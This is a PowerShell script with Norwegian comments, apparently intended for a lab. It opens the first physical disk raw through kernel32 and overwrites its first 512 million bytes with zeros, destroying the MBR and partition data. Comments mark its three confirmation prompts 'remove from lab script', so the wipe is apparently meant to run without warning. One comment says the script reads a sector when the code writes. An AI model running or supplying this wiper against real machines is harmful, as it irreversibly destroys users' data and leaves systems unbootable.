

#fjern fra lab script
read-host "Er du sikker på at du vil slette MBR? Dette kan gjøre systemet ustartbart! Trykk Enter for å fortsette eller Ctrl+C for å avbryte."
read-host "Trykk Enter for å bekrefte."
read-host "Er du helt sikker? Dette kan ikke angres!"
#fjern fra lab script

$code = @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class RawDisk {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );
}
"@
Add-Type -TypeDefinition $code

# 2. Konstanter som gyldig UInt32 (fikser feilmeldingen)
[uint32]$GENERIC_RW = "0xC0000000"
[uint32]$FILE_SHARE_RW = 3
[uint32]$OPEN_EXISTING = 3

$diskPath = "\\.\PhysicalDrive0"

# 3. Åpne SafeFileHandle mot rå disk
$handle = [RawDisk]::CreateFile($diskPath, $GENERIC_RW, $FILE_SHARE_RW, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)

if ($null -eq $handle -or $handle.IsInvalid) {
    throw "Kunne ikke åpne disken. Husk å kjøre PowerShell som Administrator."
}

# 4. Koble handle til FileStream og les 1 sektor (512 bytes)
try {
    $fs = New-Object System.IO.FileStream($handle, [System.IO.FileAccess]::ReadWrite)
    
    # 5. Skriv nuller til disken, i biter (unngår å allokere én kjempestor buffer)
    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $chunkSize  = 512
    $totalBytes = [int64]512 * 1000000
    $zeroBuffer = New-Object byte[] $chunkSize
    $written = 0L
    try {
        while ($written -lt $totalBytes) {
            $toWrite = [Math]::Min($chunkSize, $totalBytes - $written)
            $fs.Write($zeroBuffer, 0, $toWrite)
            $written += $toWrite
        }
        $fs.Flush()
    }
    catch {
        $sektor = $written / 512
        throw
    }
}
finally {
    if ($fs) { $fs.Close() }
    if ($handle) { $handle.Close() }
}
